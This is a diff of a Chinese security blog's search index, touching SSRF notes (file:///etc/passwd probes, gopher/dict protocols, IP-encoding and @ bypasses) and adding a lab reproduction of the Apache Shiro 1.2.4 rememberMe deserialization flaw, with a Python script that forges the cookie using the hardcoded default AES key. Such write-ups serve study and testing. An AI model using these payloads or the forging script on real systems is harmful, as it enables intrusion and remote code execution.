@@ -37,14 +37,15 @@
 <p>图片加载存在于很多的编辑器中，编辑器上传图片处，有的是加载远程图片到服务器内。还有一些采用了加载远程图片的形式，本地文章加载了设定好的远程图片服务器上的图片地址，如果没对加载的参数做限制可能造成SSRF</p>
 <h5 id="图片、文章收藏功能"><a href="#图片、文章收藏功能" class="headerlink" title="图片、文章收藏功能"></a>图片、文章收藏功能</h5><p><a href="http://title.xxx.com/title?title=file://etc/passwd">http://title.xxx.com/title?title=file://etc/passwd</a></p>
 <p>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF.</p>
-<h5 id="代理服务，文件包含，多媒体加载，在线编程，站长工具，RSS-xml"><a href="#代理服务，文件包含，多媒体加载，在线编程，站长工具，RSS-xml" class="headerlink" title="代理服务，文件包含，多媒体加载，在线编程，站长工具，RSS,xml,"></a>代理服务，文件包含，多媒体加载，在线编程，站长工具，RSS,xml,</h5><h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><p>SSRF漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器发送的，从而来判断是否存在SSRF漏洞。，</p>
+<p><strong>代理服务，文件包含，多媒体加载，在线编程，站长工具，RSS,xml,</strong></p>
+<h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><p>SSRF漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器发送的，从而来判断是否存在SSRF漏洞。，</p>
 <p>如果网站访问的百度页面，抓包的内容组并没有请求百度，那就说明请求是由服务器发出的，存在ssrf漏洞</p>
 <h5 id="SSRF常用协议"><a href="#SSRF常用协议" class="headerlink" title="SSRF常用协议"></a>SSRF常用协议</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///  看文件，端口扫描，命令执行</span><br><span class="line"></span><br><span class="line">dict://   端口扫描，命令执行</span><br><span class="line"></span><br><span class="line">sftp://  传输</span><br><span class="line"></span><br><span class="line">ftp://</span><br><span class="line"></span><br><span class="line">tftp://  </span><br><span class="line"></span><br><span class="line">ldap://  轻量级目录访问</span><br><span class="line"></span><br><span class="line">gopher://   万金油</span><br></pre></td></tr></table></figure>
 
 <h5 id="常见触发参数名"><a href="#常见触发参数名" class="headerlink" title="常见触发参数名"></a>常见触发参数名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">share	wap	url	link	src	source</span><br><span class="line"></span><br><span class="line">target	u	3g	display	sourceURI</span><br><span class="line"></span><br><span class="line">imageURL	domain</span><br></pre></td></tr></table></figure>
 
 <h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><p><strong>@绕过</strong> </p>
-<p><a href="http://www.cbaidu/">http://www.baidu</a><a href="mailto:&#x2e;&#x63;&#x6f;&#x6d;&#64;&#49;&#x32;&#55;&#x2e;&#x30;&#46;&#x30;&#x2e;&#x31;">&#x2e;&#x63;&#x6f;&#x6d;&#64;&#49;&#x32;&#55;&#x2e;&#x30;&#46;&#x30;&#x2e;&#x31;</a>:8080</p>
+<p><a href="http://www.cbaidu/">http://www.baidu</a><a href="mailto:&#x2e;&#x63;&#x6f;&#x6d;&#x40;&#49;&#x32;&#55;&#46;&#48;&#x2e;&#x30;&#x2e;&#49;">&#x2e;&#x63;&#x6f;&#x6d;&#x40;&#49;&#x32;&#55;&#46;&#48;&#x2e;&#x30;&#x2e;&#49;</a>:8080</p>
 <p><strong>ip地址转换成进制</strong>绕过</p>
 <p>ping 2130706433</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2023/png/35329361/1685932689118-1545318e-a582-4769-b926-3bb6b69527ad.png" alt="img"></p>
@@ -74,6 +75,55 @@
       <tags>
         <tag>网络安全</tag>
         <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>shiro复现</title>
+    <url>/2023/06/12/shiro%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/apache/shiro.git</span><br><span class="line"><span class="built_in">cd</span> shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></table></figure>
+
+
+
+<p>找到shiro&#x2F;samples&#x2F;web里面的pom.xml，把jstl的版本改成1.2</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>加一个version</p>
+<p>配一下tomcat</p>
+<h3 id="看登录逻辑"><a href="#看登录逻辑" class="headerlink" title="看登录逻辑"></a>看登录逻辑</h3><p>看一下登录包</p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/image-20230612164707912.png" alt="image-20230612164707912"></p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/image-20230612164815088.png" alt="image-20230612164815088"></p>
+<p>shiro登录逻辑是，点击remmerberme之后</p>
+<p>第一个请求的返回会给一串set-cookie，然后你就用这个和他发起请求</p>
+<h4 id="找源码"><a href="#找源码" class="headerlink" title="找源码"></a>找源码</h4><p>去看源码，找一下cookie</p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612171725697.png" alt="image-20230612171725697"></p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612171735017.png" alt="image-20230612171735017"></p>
+<p>往下看，能看到base64编码</p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172015492.png" alt="image-20230612172015492"></p>
+<p>看看哪里调用了这个方法</p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172106578.png" alt="image-20230612172106578"></p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172125292.png" alt="image-20230612172125292"></p>
+<p>找到这个，</p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172603128.png" alt="image-20230612172603128"></p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172616571.png" alt="image-20230612172616571"></p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172626606.png" alt="image-20230612172626606"></p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172644597.png" alt="image-20230612172644597"></p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172718535.png" alt="image-20230612172718535"></p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/image-20230612172725265.png" alt="image-20230612172725265">发现key是常量</p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/image-20230612214512006.png" alt="image-20230612214512006"></p>
+<p>iv是随便取的</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 加密脚本</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_data</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_enc</span>(<span class="params">data</span>):</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_dec</span>(<span class="params">enc_data</span>):</span><br><span class="line">    enc_data = base64.b64decode(enc_data)</span><br><span class="line">    unpad = <span class="keyword">lambda</span> s: s[:-s[-<span class="number">1</span>]]</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = enc_data[:<span class="number">16</span>]</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    plaintext = encryptor.decrypt(enc_data[<span class="number">16</span>:])</span><br><span class="line">    <span class="comment"># plaintext = bytes.decode(plaintext)</span></span><br><span class="line">    plaintext = unpad(plaintext)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># enc_data = b&quot;AALv9ZLoHe8dKEtIeH7y/2i9M9S70eanvsGbaN+DYSInYaw1cjtZvWNhXegmgP2DLI+VHLIxBrahwOUK4XNB2Vr</span></span><br><span class="line">    <span class="comment"># plaintext = aes_dec(enc_data)</span></span><br><span class="line">    <span class="comment"># print(plaintext)</span></span><br><span class="line">    data = get_file_data(<span class="string">&quot;ser.bin&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(aes_enc(data))</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="自查检测工具"><a href="#自查检测工具" class="headerlink" title="自查检测工具"></a>自查检测工具</h3><p><a href="https://shiro.sumsec.me/">https://shiro.sumsec.me/</a></p>
+<p>参考链接：<a href="https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.880.my_history.page.click&vd_source=46ee6094905cc129c486ece81308d827">https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.880.my_history.page.click&amp;vd_source=46ee6094905cc129c486ece81308d827</a></p>
+]]></content>
+      <tags>
+        <tag>网络安全</tag>
       </tags>
   </entry>
   <entry>
